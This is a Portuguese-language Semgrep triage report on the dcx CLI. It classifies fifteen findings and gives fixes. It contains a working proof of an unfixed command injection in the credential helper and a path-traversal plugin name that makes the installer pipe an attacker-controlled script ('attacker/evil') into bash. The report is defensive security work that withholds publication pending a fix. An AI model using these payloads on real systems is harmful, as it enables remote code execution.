# Triagem Semgrep — datacosmos-br/dcx

> **NÃO PUBLICAR ATÉ CORREÇÃO.** Este documento contém prova de exploração reproduzível
> de uma RCE **ainda não corrigida** em um repositório **público**. Mantido local
> (não commitado, não enviado) até decisão do operador. Ver [Situação de divulgação](#situacao-de-divulgacao).

Gerado do dump da plataforma Semgrep (deployment `datacosmos`, 2026-08-06).

Bead: `dcx-nes.2`

Commit auditado: `5b707ae7a2233d34dc242f167cc38f140a33af83` (== `HEAD` de `develop` na triagem)

## Resumo

**15 findings** — high 12, medium 3, low 0
Confiança: high 0, medium 0, low 15

| regra | achados |
|---|---|
| `go.lang.security.audit.dangerous-exec-command.dangerous-exec-command` | 12 |
| `go.lang.security.decompression_bomb.potential-dos-via-decompression-bomb` | 2 |
| `bash.curl.security.curl-pipe-bash.curl-pipe-bash` | 1 |

### Resultado da triagem

| grupo | local | achados | decisão |
|---|---|---|---|
| A | `cmd/dcx/cred.go:275` | 1 high | **corrigir — P0, RCE confirmada em runtime** |
| B | `cmd/dcx/lint.go:56` | 1 high | pendente-autorização (sem caminho explorável) |
| C | `cmd/dcx/validate.go` | 10 high | pendente-autorização (sem caminho explorável) |
| D | `cmd/dcx/tools.go:393,430` | 2 medium | **corrigir — P1** |
| E | `install.sh:561` | 1 medium | **corrigir — P1, cadeia de suprimentos** |

Os 12 achados `high` estão classificados (critério de aceite do bead `dcx-nes.2`).
Os 3 `medium` também foram classificados.

## Como usar

Cada finding traz a **mensagem completa da regra**, o **código real** (linha `>>>`), classe de
vulnerabilidade e a decisão. **Decisão**: `corrigir` / `falso-positivo` / `risco-aceito` /
`pendente-autorização`.

> `falso-positivo` **não** é auto-atribuível: por `rules/security/scanner-closure`, exige
> discussão prévia com o operador, prova técnica reproduzível e autorização explícita. Os
> grupos B e C têm a prova técnica registrada abaixo, mas permanecem
> `pendente-autorização` até o operador decidir.

---

## Análise por grupo

### Grupo A · `cmd/dcx/cred.go:275` — injeção de comando confirmada (P0)

**Veredito: verdadeiro-positivo. Execução arbitrária de comandos comprovada em runtime.**

`runCredCommand` monta uma string de shell e a entrega a `bash -c`:

```go
bashCmd := fmt.Sprintf("source %q && %s", credShPath, funcCall)
cmd := exec.Command("bash", "-c", bashCmd)
```

Os chamadores interpolam entrada do usuário com `%q`:

| linha | construção | entrada controlada |
|---|---|---|
| `cred.go:110` | `cred_set %q %q` | `key`, `value` |
| `cred.go:129` | `cred_get %q` | `key` |
| `cred.go:209` | `cred_delete %q` | `key` |
| `cred.go:241` | `cred_export %q` | `prefix` |

**Causa raiz:** `%q` produz um literal de string **Go**, não uma citação de **shell**. `%q`
escapa `"` e `\`, mas **não** escapa `$` nem crase. O resultado é interpolado dentro de
aspas duplas do bash, onde `$(...)`, `` `...` `` e `${...}` continuam sendo expandidos.

**Prova executada** — espelho byte-a-byte de `runCredCommand`, com o `lib/cred.sh` real:

```text
$ bash -c 'source "/home/marlonsc/dcx/lib/cred.sh" && cred_get "$(echo INJECTED_MARKER_7731 >&2)"'
INJECTED_MARKER_7731            <-- payload EXECUTADO
[ERROR] Usage: cred_get <key>
```

A substituição de comando é avaliada durante a expansão dos argumentos, **antes** de
`cred_get` ser invocada — a validação dentro de `cred.sh` é irrelevante.

**Validação existente não protege:** apenas `cred set` valida o formato da chave
(`cred.go:101-105`, ≥3 segmentos separados por `/`), e `a/b/$(cmd)` satisfaz essa regra.
`cred get`, `cred delete` e `cred export` não validam nada.

**Fronteira de confiança:** o vetor é qualquer chamador que passe uma chave/prefixo não
literal para `dcx cred` — script de automação, CI, arquivo de configuração, nome de serviço
vindo de dados. O próprio repositório registra esse consumo em
`.sisyphus/plans/oc-workflow-dcx-oracle-rescue.md:34` (`dcx-oracle/commands/migrate.sh`
carrega credenciais via `dcx cred export` e usa `eval`).

**Correção no owner (verificada):** não construir string de shell; passar valores como
argumentos posicionais.

```go
cmd := exec.Command("bash", "-c", `source "$1" && "$2" "${@:3}"`,
	"_", credShPath, funcName, funcArgs...)
```

Comprovação das duas formas, lado a lado:

```text
# A) forma atual (vulnerável)
$ bash -c 'source "…/lib/cred.sh" && cred_get "$(echo INJECTED_MARKER_7731 >&2)"'
INJECTED_MARKER_7731            <-- executado

# B) forma corrigida (argv)
$ bash -c 'source "$1" && "$2" "${@:3}"' _ …/lib/cred.sh cred_get 'a/b/$(echo INJECTED_MARKER_7731 >&2)'
[ERROR] Credentials file not found: …/etc/credentials.enc
                                <-- SEM marcador: payload tratado como chave literal

# C) chave normal continua íntegra na forma corrigida
$ bash -c 'source "$1" && printf "ARG_RECEIVED=[%s]\n" "$3"' _ …/lib/cred.sh cred_get 'oracle/prod/password'
ARG_RECEIVED=[oracle/prod/password]
```

`exec.Command` já não usa shell para o `argv`; o defeito é exclusivamente a montagem da
string. A correção elimina a montagem, não a acrescenta um filtro.

### Grupo B · `cmd/dcx/lint.go:56` — argv sem shell

**Veredito técnico: sem caminho de injeção de código.**

```go
cmdArgs := []string{"scan", "--rule", ruleFile}
cmdArgs = append(cmdArgs, paths...)   // paths := args (CLI do usuário)
cmd := exec.Command(sg, cmdArgs...)
```

`exec.Command` recebe um `argv` já separado e **não** invoca shell, então metacaracteres não
são interpretados. O primeiro argumento vem de `findBinary("sg")` — nome literal.

Risco residual real, porém de outra classe: `paths` do usuário entra como `argv` de `sg`, ou
seja, o usuário pode passar **flags** para `ast-grep` (injeção de argumento). Como quem
fornece `paths` é o próprio operador que digitou `dcx lint …`, ele já podia executar `sg`
diretamente — nenhuma fronteira de privilégio é cruzada. Endurecimento opcional: `append`
de `--` antes de `paths...`.

Mantido `pendente-autorização`: a classificação como falso-positivo exige autorização do operador.

### Grupo C · `cmd/dcx/validate.go` (10 achados) — argv estático

**Veredito técnico: sem caminho de injeção de código.**

Todos os 10 sítios têm a mesma forma: `exec.Command(<bin>, <args estáticos>)`, onde `<bin>`
vem de `findBinary("gum"|"yq"|"rg"|"fd"|"sd"|"sg")` — **sempre um literal no código**
(confirmado: `validate.go:27,41,59,75,90,110`). Nenhum argumento vem da CLI; os caminhos de
arquivo são derivados de `os.MkdirTemp` (`validate.go:13`). Sem shell.

O que a regra realmente sinaliza é que o primeiro argumento não é constante. Ele é resolvido
por `findBinary` (`cmd/dcx/binary.go:41-73`) em `ORACLE_HOME/bin` → `DCX_HOME/bin` →
`exec.LookPath` (`PATH`). Isso é sequestro de `PATH`/`DCX_HOME`, que exige controle prévio
do ambiente do próprio usuário que executa `dcx` — mesmo nível de privilégio, não elevação.
É também a semântica pretendida de um wrapper de CLI que executa ferramentas locais.

Mantido `pendente-autorização`: a classificação como falso-positivo exige autorização do operador.

### Grupo D · `cmd/dcx/tools.go:393,430` — descompressão ilimitada sem verificação de integridade (P1)

**Veredito: verdadeiro-positivo, agravado por um defeito adjacente não sinalizado pelo scanner.**

`io.Copy(out, tr)` (tar.gz, linha 393) e `io.Copy(out, rc)` (zip, linha 430) escrevem o
conteúdo descomprimido sem limite de bytes.

**Agravante encontrado na auditoria:** o arquivo é baixado **sem nenhuma verificação de
integridade**. `etc/tools.yaml:9` declara `verify_checksum: true` e
`cmd/dcx/tools.go:63` faz o parse do campo em `VerifyChecksum bool`, mas **nada lê esse
campo** — busca em todo o repositório retorna apenas essas duas ocorrências mais o
`_verify_checksum` do `install.sh` (que é outro caminho de código):

```text
$ grep -rn 'VerifyChecksum|verify_checksum' . --exclude-dir=.git
install.sh:168:_verify_checksum() {
install.sh:298:        if _verify_checksum "$tarball_path" "$expected_checksum"; then
cmd/dcx/tools.go:63:		VerifyChecksum bool   `yaml:"verify_checksum"`
etc/tools.yaml:9:  verify_checksum: true
```

Ou seja: a configuração promete um controle de segurança que o código Go nunca executa.
`downloadFile` (`tools.go:336-355`) faz `http.Get` e `io.Copy` direto para o disco, sem
hash. Isso é falha silenciosa — o operador lê `verify_checksum: true` e conclui que há
verificação.

**Correção no owner:**

1. Implementar de fato `VerifyChecksum` (hash esperado por plataforma em `etc/tools.yaml`)
   ou remover o campo e a chave do YAML — não deixar as duas coisas coexistindo.
2. Trocar `io.Copy` por `io.CopyN` com teto explícito por artefato, tratando
   `n == limite` como erro.

Observação adjacente (fora dos 15 achados, registrada como evidência): o
`_verify_checksum` do `install.sh` normaliza falha em dois pontos — retorna `0` quando não
há ferramenta de hash (`install.sh:176-179`) e o bloco inteiro é condicional ao download do
`.sha256` ter dado certo (`install.sh:293`), então a verificação é silenciosamente pulada.

### Grupo E · `install.sh:561` — `curl … | bash` com repositório controlável (P1)

**Veredito: verdadeiro-positivo, com escalada além do que a regra descreve.**

```bash
plugin_repo="datacosmos-br/dcx-${plugin_name}"
plugin_install_url="https://raw.githubusercontent.com/${plugin_repo}/main/install.sh"
curl -fsSL "$plugin_install_url" 2>/dev/null | bash -s -- --skip-dcx
```

A regra aponta a ausência de verificação de integridade do script canalizado para `bash`.
Isso procede: não há checagem de hash nem de assinatura.

**Escalada:** `plugin_name` vem sem validação de `--plugin/--plugins`
(`install.sh:473-474` → `_install_plugins` → `_install_plugin`). Quando o nome não está em
`PLUGIN_REPOS`, ele é concatenado direto na URL. `curl` normaliza segmentos `..` do caminho,
então um nome com travessia redireciona o download para um repositório arbitrário.

**Prova executada** (servidor HTTP local, sem tráfego externo):

```text
plugin_name = 'x/../../attacker/evil'
URL construída  = http://127.0.0.1:36019/datacosmos-br/dcx-x/../../attacker/evil/main/install.sh
servidor recebeu= GET /attacker/evil/main/install.sh HTTP/1.1
curl 8.21.0 (x86_64-pc-linux-musl)
```

Ou seja, `--plugin 'x/../../attacker/evil'` faz o instalador canalizar
`https://raw.githubusercontent.com/attacker/evil/main/install.sh` para `bash`. Relevante
sempre que o nome do plugin não for 100% controlado pelo operador (script de provisionamento,
CI, parâmetro de automação).

**Correção no owner:**
1. Validar `plugin_name` contra um padrão restrito (ex.: `^[a-z0-9][a-z0-9-]*$`) e rejeitar
   `/`, `.` e `..` antes de montar a URL.
2. Preferir consulta em `PLUGIN_REPOS` e recusar nomes desconhecidos, em vez de derivar a URL.
3. Baixar para arquivo, verificar hash/assinatura e só então executar — em vez de canalizar
   direto para `bash`.

---

## Findings

### 1 · 🟠 HIGH · conf low · `go.lang.security.audit.dangerous-exec-command.dangerous-exec-command`
**Classe**: Code Injection · **Local**: `cmd/dcx/cred.go:275` · **Grupo A**

> Detected non-static command inside Command. Audit the input to 'exec.Command'. If unverified user data can reach this call site, this is a code injection vulnerability. A malicious actor can inject a malicious script to execute arbitrary code.

```go
      269  	}
      270  
      271  	// Build bash command that sources cred.sh and calls the function
      272  	bashCmd := fmt.Sprintf("source %q && %s", credShPath, funcCall)
      273  
      274  	// Execute with bash
>>>   275  	cmd := exec.Command("bash", "-c", bashCmd)
      276  
      277  	// Set DCX_HOME in environment
      278  	cmd.Env = append(os.Environ(), fmt.Sprintf("DCX_HOME=%s", getDCHome()))
      279  
```

**Decisão**: corrigir — **P0 / RCE confirmada**

**Evidência**: Injeção de comando comprovada em runtime. Ver [Grupo A](#grupo-a--cmddcxcredgo275--injecao-de-comando-confirmada-p0).

### 2 · 🟠 HIGH · conf low · `go.lang.security.audit.dangerous-exec-command.dangerous-exec-command`
**Classe**: Code Injection · **Local**: `cmd/dcx/lint.go:56` · **Grupo B**

> Detected non-static command inside Command. Audit the input to 'exec.Command'. If unverified user data can reach this call site, this is a code injection vulnerability. A malicious actor can inject a malicious script to execute arbitrary code.

```go
       50  		ruleName := filepath.Base(ruleFile)
       51  		fmt.Printf("=== Checking: %s ===\n", ruleName)
       52  
       53  		cmdArgs := []string{"scan", "--rule", ruleFile}
       54  		cmdArgs = append(cmdArgs, paths...)
       55  
>>>    56  		cmd := exec.Command(sg, cmdArgs...)
       57  		cmd.Stdout = os.Stdout
       58  		cmd.Stderr = os.Stderr
       59  		cmd.Dir = dcHome
       60  
```

**Decisão**: pendente-autorização (sem caminho explorável identificado)

**Evidência**: `exec.Command` recebe `argv` — não há shell. Ver [Grupo B](#grupo-b--cmddcxlintgo56--argv-sem-shell).

### 3 · 🟠 HIGH · conf low · `go.lang.security.audit.dangerous-exec-command.dangerous-exec-command`
**Classe**: Code Injection · **Local**: `cmd/dcx/validate.go:28` · **Grupo C**

> Detected non-static command inside Command. Audit the input to 'exec.Command'. If unverified user data can reach this call site, this is a code injection vulnerability. A malicious actor can inject a malicious script to execute arbitrary code.

```go
       22  
       23  	failed := 0
       24  
       25  	// Test GUM (required)
       26  	fmt.Print("  gum: ")
       27  	if gum, err := findBinary("gum"); err == nil {
>>>    28  		if out, err := exec.Command(gum, "--version").Output(); err == nil {
       29  			fmt.Printf("OK (%s)\n", strings.TrimSpace(string(out)))
       30  		} else {
       31  			fmt.Println("FAIL (not working)")
       32  			failed++
```

**Decisão**: pendente-autorização (sem caminho explorável identificado)

**Evidência**: Binário resolvido de nome literal; argumentos estáticos ou derivados de `os.MkdirTemp`. Ver [Grupo C](#grupo-c--cmddcxvalidatego-10-achados--argv-estatico).

### 4 · 🟠 HIGH · conf low · `go.lang.security.audit.dangerous-exec-command.dangerous-exec-command`
**Classe**: Code Injection · **Local**: `cmd/dcx/validate.go:44` · **Grupo C**

> Detected non-static command inside Command. Audit the input to 'exec.Command'. If unverified user data can reach this call site, this is a code injection vulnerability. A malicious actor can inject a malicious script to execute arbitrary code.

```go
       38  
       39  	// Test YQ (required)
       40  	fmt.Print("  yq:  ")
       41  	if yq, err := findBinary("yq"); err == nil {
       42  		testFile := filepath.Join(tmpDir, "test.yaml")
       43  		os.WriteFile(testFile, []byte("test: value"), 0644)
>>>    44  		out, err := exec.Command(yq, ".test", testFile).Output()
       45  		if err == nil && strings.TrimSpace(string(out)) == "value" {
       46  			verOut, _ := exec.Command(yq, "--version").Output()
       47  			fmt.Printf("OK (%s)\n", strings.TrimSpace(string(verOut)))
       48  		} else {
```

**Decisão**: pendente-autorização (sem caminho explorável identificado)

**Evidência**: Binário resolvido de nome literal; argumentos estáticos ou derivados de `os.MkdirTemp`. Ver [Grupo C](#grupo-c--cmddcxvalidatego-10-achados--argv-estatico).

### 5 · 🟠 HIGH · conf low · `go.lang.security.audit.dangerous-exec-command.dangerous-exec-command`
**Classe**: Code Injection · **Local**: `cmd/dcx/validate.go:46` · **Grupo C**

> Detected non-static command inside Command. Audit the input to 'exec.Command'. If unverified user data can reach this call site, this is a code injection vulnerability. A malicious actor can inject a malicious script to execute arbitrary code.

```go
       40  	fmt.Print("  yq:  ")
       41  	if yq, err := findBinary("yq"); err == nil {
       42  		testFile := filepath.Join(tmpDir, "test.yaml")
       43  		os.WriteFile(testFile, []byte("test: value"), 0644)
       44  		out, err := exec.Command(yq, ".test", testFile).Output()
       45  		if err == nil && strings.TrimSpace(string(out)) == "value" {
>>>    46  			verOut, _ := exec.Command(yq, "--version").Output()
       47  			fmt.Printf("OK (%s)\n", strings.TrimSpace(string(verOut)))
       48  		} else {
       49  			fmt.Println("FAIL (not working)")
       50  			failed++
```

**Decisão**: pendente-autorização (sem caminho explorável identificado)

**Evidência**: Binário resolvido de nome literal; argumentos estáticos ou derivados de `os.MkdirTemp`. Ver [Grupo C](#grupo-c--cmddcxvalidatego-10-achados--argv-estatico).

### 6 · 🟠 HIGH · conf low · `go.lang.security.audit.dangerous-exec-command.dangerous-exec-command`
**Classe**: Code Injection · **Local**: `cmd/dcx/validate.go:62` · **Grupo C**

> Detected non-static command inside Command. Audit the input to 'exec.Command'. If unverified user data can reach this call site, this is a code injection vulnerability. A malicious actor can inject a malicious script to execute arbitrary code.

```go
       56  
       57  	// Test RG (optional)
       58  	fmt.Print("  rg:  ")
       59  	if rg, err := findBinary("rg"); err == nil {
       60  		testFile := filepath.Join(tmpDir, "test.txt")
       61  		os.WriteFile(testFile, []byte("test pattern here"), 0644)
>>>    62  		if err := exec.Command(rg, "-q", "pattern", testFile).Run(); err == nil {
       63  			verOut, _ := exec.Command(rg, "--version").Output()
       64  			version := strings.Split(string(verOut), "\n")[0]
       65  			fmt.Printf("OK (%s)\n", strings.TrimSpace(version))
       66  		} else {
```

**Decisão**: pendente-autorização (sem caminho explorável identificado)

**Evidência**: Binário resolvido de nome literal; argumentos estáticos ou derivados de `os.MkdirTemp`. Ver [Grupo C](#grupo-c--cmddcxvalidatego-10-achados--argv-estatico).

### 7 · 🟠 HIGH · conf low · `go.lang.security.audit.dangerous-exec-command.dangerous-exec-command`
**Classe**: Code Injection · **Local**: `cmd/dcx/validate.go:63` · **Grupo C**

> Detected non-static command inside Command. Audit the input to 'exec.Command'. If unverified user data can reach this call site, this is a code injection vulnerability. A malicious actor can inject a malicious script to execute arbitrary code.

```go
       57  	// Test RG (optional)
       58  	fmt.Print("  rg:  ")
       59  	if rg, err := findBinary("rg"); err == nil {
       60  		testFile := filepath.Join(tmpDir, "test.txt")
       61  		os.WriteFile(testFile, []byte("test pattern here"), 0644)
       62  		if err := exec.Command(rg, "-q", "pattern", testFile).Run(); err == nil {
>>>    63  			verOut, _ := exec.Command(rg, "--version").Output()
       64  			version := strings.Split(string(verOut), "\n")[0]
       65  			fmt.Printf("OK (%s)\n", strings.TrimSpace(version))
       66  		} else {
       67  			fmt.Println("FAIL (not working)")
```

**Decisão**: pendente-autorização (sem caminho explorável identificado)

**Evidência**: Binário resolvido de nome literal; argumentos estáticos ou derivados de `os.MkdirTemp`. Ver [Grupo C](#grupo-c--cmddcxvalidatego-10-achados--argv-estatico).

### 8 · 🟠 HIGH · conf low · `go.lang.security.audit.dangerous-exec-command.dangerous-exec-command`
**Classe**: Code Injection · **Local**: `cmd/dcx/validate.go:78` · **Grupo C**

> Detected non-static command inside Command. Audit the input to 'exec.Command'. If unverified user data can reach this call site, this is a code injection vulnerability. A malicious actor can inject a malicious script to execute arbitrary code.

```go
       72  
       73  	// Test FD (optional)
       74  	fmt.Print("  fd:  ")
       75  	if fd, err := findBinary("fd"); err == nil {
       76  		testFile := filepath.Join(tmpDir, "findme.txt")
       77  		os.WriteFile(testFile, []byte(""), 0644)
>>>    78  		if err := exec.Command(fd, "-q", "findme", tmpDir).Run(); err == nil {
       79  			verOut, _ := exec.Command(fd, "--version").Output()
       80  			fmt.Printf("OK (%s)\n", strings.TrimSpace(string(verOut)))
       81  		} else {
       82  			fmt.Println("FAIL (not working)")
```

**Decisão**: pendente-autorização (sem caminho explorável identificado)

**Evidência**: Binário resolvido de nome literal; argumentos estáticos ou derivados de `os.MkdirTemp`. Ver [Grupo C](#grupo-c--cmddcxvalidatego-10-achados--argv-estatico).

### 9 · 🟠 HIGH · conf low · `go.lang.security.audit.dangerous-exec-command.dangerous-exec-command`
**Classe**: Code Injection · **Local**: `cmd/dcx/validate.go:79` · **Grupo C**

> Detected non-static command inside Command. Audit the input to 'exec.Command'. If unverified user data can reach this call site, this is a code injection vulnerability. A malicious actor can inject a malicious script to execute arbitrary code.

```go
       73  	// Test FD (optional)
       74  	fmt.Print("  fd:  ")
       75  	if fd, err := findBinary("fd"); err == nil {
       76  		testFile := filepath.Join(tmpDir, "findme.txt")
       77  		os.WriteFile(testFile, []byte(""), 0644)
       78  		if err := exec.Command(fd, "-q", "findme", tmpDir).Run(); err == nil {
>>>    79  			verOut, _ := exec.Command(fd, "--version").Output()
       80  			fmt.Printf("OK (%s)\n", strings.TrimSpace(string(verOut)))
       81  		} else {
       82  			fmt.Println("FAIL (not working)")
       83  		}
```

**Decisão**: pendente-autorização (sem caminho explorável identificado)

**Evidência**: Binário resolvido de nome literal; argumentos estáticos ou derivados de `os.MkdirTemp`. Ver [Grupo C](#grupo-c--cmddcxvalidatego-10-achados--argv-estatico).

### 10 · 🟠 HIGH · conf low · `go.lang.security.audit.dangerous-exec-command.dangerous-exec-command`
**Classe**: Code Injection · **Local**: `cmd/dcx/validate.go:93` · **Grupo C**

> Detected non-static command inside Command. Audit the input to 'exec.Command'. If unverified user data can reach this call site, this is a code injection vulnerability. A malicious actor can inject a malicious script to execute arbitrary code.

```go
       87  
       88  	// Test SD (optional)
       89  	fmt.Print("  sd:  ")
       90  	if sd, err := findBinary("sd"); err == nil {
       91  		testFile := filepath.Join(tmpDir, "replace.txt")
       92  		os.WriteFile(testFile, []byte("old text"), 0644)
>>>    93  		if err := exec.Command(sd, "old", "new", testFile).Run(); err == nil {
       94  			content, _ := os.ReadFile(testFile)
       95  			if strings.Contains(string(content), "new") {
       96  				verOut, _ := exec.Command(sd, "--version").Output()
       97  				fmt.Printf("OK (%s)\n", strings.TrimSpace(string(verOut)))
```

**Decisão**: pendente-autorização (sem caminho explorável identificado)

**Evidência**: Binário resolvido de nome literal; argumentos estáticos ou derivados de `os.MkdirTemp`. Ver [Grupo C](#grupo-c--cmddcxvalidatego-10-achados--argv-estatico).

### 11 · 🟠 HIGH · conf low · `go.lang.security.audit.dangerous-exec-command.dangerous-exec-command`
**Classe**: Code Injection · **Local**: `cmd/dcx/validate.go:96` · **Grupo C**

> Detected non-static command inside Command. Audit the input to 'exec.Command'. If unverified user data can reach this call site, this is a code injection vulnerability. A malicious actor can inject a malicious script to execute arbitrary code.

```go
       90  	if sd, err := findBinary("sd"); err == nil {
       91  		testFile := filepath.Join(tmpDir, "replace.txt")
       92  		os.WriteFile(testFile, []byte("old text"), 0644)
       93  		if err := exec.Command(sd, "old", "new", testFile).Run(); err == nil {
       94  			content, _ := os.ReadFile(testFile)
       95  			if strings.Contains(string(content), "new") {
>>>    96  				verOut, _ := exec.Command(sd, "--version").Output()
       97  				fmt.Printf("OK (%s)\n", strings.TrimSpace(string(verOut)))
       98  			} else {
       99  				fmt.Println("FAIL (replacement didn't work)")
      100  			}
```

**Decisão**: pendente-autorização (sem caminho explorável identificado)

**Evidência**: Binário resolvido de nome literal; argumentos estáticos ou derivados de `os.MkdirTemp`. Ver [Grupo C](#grupo-c--cmddcxvalidatego-10-achados--argv-estatico).

### 12 · 🟠 HIGH · conf low · `go.lang.security.audit.dangerous-exec-command.dangerous-exec-command`
**Classe**: Code Injection · **Local**: `cmd/dcx/validate.go:111` · **Grupo C**

> Detected non-static command inside Command. Audit the input to 'exec.Command'. If unverified user data can reach this call site, this is a code injection vulnerability. A malicious actor can inject a malicious script to execute arbitrary code.

```go
      105  		fmt.Println("SKIP (optional)")
      106  	}
      107  
      108  	// Test SG / ast-grep (optional)
      109  	fmt.Print("  sg:  ")
      110  	if sg, err := findBinary("sg"); err == nil {
>>>   111  		if out, err := exec.Command(sg, "--version").Output(); err == nil {
      112  			fmt.Printf("OK (%s)\n", strings.TrimSpace(string(out)))
      113  		} else {
      114  			fmt.Println("FAIL (not working)")
      115  		}
```

**Decisão**: pendente-autorização (sem caminho explorável identificado)

**Evidência**: Binário resolvido de nome literal; argumentos estáticos ou derivados de `os.MkdirTemp`. Ver [Grupo C](#grupo-c--cmddcxvalidatego-10-achados--argv-estatico).

### 13 · 🟡 MEDIUM · conf low · `go.lang.security.decompression_bomb.potential-dos-via-decompression-bomb`
**Classe**: Denial-of-Service (DoS) · **Local**: `cmd/dcx/tools.go:393` · **Grupo D**

> Detected a possible denial-of-service via a zip bomb attack. By limiting the max bytes read, you can mitigate this attack. `io.CopyN()` can specify a size.

```go
      387  		baseName := filepath.Base(header.Name)
      388  		if matchesBinaryName(baseName, binaryName) {
      389  			out, err := os.OpenFile(dest, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
      390  			if err != nil {
      391  				return err
      392  			}
>>>   393  			if _, err := io.Copy(out, tr); err != nil {
      394  				out.Close()
      395  				return err
      396  			}
      397  			out.Close()
```

**Decisão**: corrigir — **P1**

**Evidência**: `io.Copy` sem limite sobre arquivo baixado **sem verificação de integridade**. Ver [Grupo D](#grupo-d--cmddcxtoolsgo393430--descompressao-ilimitada-sem-verificacao-de-integridade-p1).

### 14 · 🟡 MEDIUM · conf low · `go.lang.security.decompression_bomb.potential-dos-via-decompression-bomb`
**Classe**: Denial-of-Service (DoS) · **Local**: `cmd/dcx/tools.go:430` · **Grupo D**

> Detected a possible denial-of-service via a zip bomb attack. By limiting the max bytes read, you can mitigate this attack. `io.CopyN()` can specify a size.

```go
      424  			out, err := os.OpenFile(dest, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
      425  			if err != nil {
      426  				rc.Close()
      427  				return err
      428  			}
      429  
>>>   430  			_, err = io.Copy(out, rc)
      431  			rc.Close()
      432  			out.Close()
      433  
      434  			if err != nil {
```

**Decisão**: corrigir — **P1**

**Evidência**: `io.Copy` sem limite sobre arquivo baixado **sem verificação de integridade**. Ver [Grupo D](#grupo-d--cmddcxtoolsgo393430--descompressao-ilimitada-sem-verificacao-de-integridade-p1).

### 15 · 🟡 MEDIUM · conf low · `bash.curl.security.curl-pipe-bash.curl-pipe-bash`
**Classe**: Code Injection · **Local**: `install.sh:561` · **Grupo E**

> Data is being piped into `bash` from a `curl` command. An attacker with control of the server in the `curl` command could inject malicious code into the pipe, resulting in a system compromise. Avoid piping untrusted data into `bash` or any other shell if you can. If you must do this, consider checking the SHA sum of the content returned by the server to verify its integrity.

```bash
      555      fi
      556  
      557      local plugin_install_url="https://raw.githubusercontent.com/${plugin_repo}/main/install.sh"
      558  
      559      _step "Installing plugin: ${plugin_name}..."
      560  
>>>   561      if curl -fsSL "$plugin_install_url" 2>/dev/null | bash -s -- --skip-dcx; then
      562          _log "Plugin '${plugin_name}' installed"
      563          return 0
      564      else
      565          _warn "Failed to install plugin '${plugin_name}' from ${plugin_repo}"
```

**Decisão**: corrigir — **P1 / cadeia de suprimentos**

**Evidência**: URL do `curl … | bash` é controlável pelo chamador via travessia de caminho. Ver [Grupo E](#grupo-e--installsh561--curl--bash-com-repositorio-controlavel-p1).

---

## Situação de divulgação

`datacosmos-br/dcx` é um repositório **público** (`gh repo view … --json visibility` →
`{"isPrivate":false,"visibility":"PUBLIC"}`). O Grupo A é uma RCE **confirmada e ainda
não corrigida**, e este documento contém a prova de exploração.

Por isso a triagem **não foi commitada nem enviada**. Publicar este arquivo — ou um PR que
o descreva — antes da correção entrega um exploit funcional para um defeito ativo em um
repositório público.

**Decisão do operador necessária** antes de qualquer `git push` / PR:

1. Corrigir o Grupo A primeiro (em privado ou via GitHub Security Advisory) e só então
   publicar a triagem; **ou**
2. Publicar agora uma versão reduzida, sem prova de exploração; **ou**
3. Autorizar explicitamente a publicação completa como está.

Até essa decisão, o registro canônico da triagem é o bead `dcx-nes.2` e este arquivo local.

## Correção de ledger

A descrição do bead `dcx-nes.2` aponta os dados em `~/semgrep-violations/by-repo/`
`datacosmos-br__dcx.json`, que **não existe**. O artefato real está em
`~/legado/semgrep-violations/by-repo/datacosmos-br__dcx.json` (12184 bytes, 2026-08-06).
Divergência corrigida no bead, não na realidade.

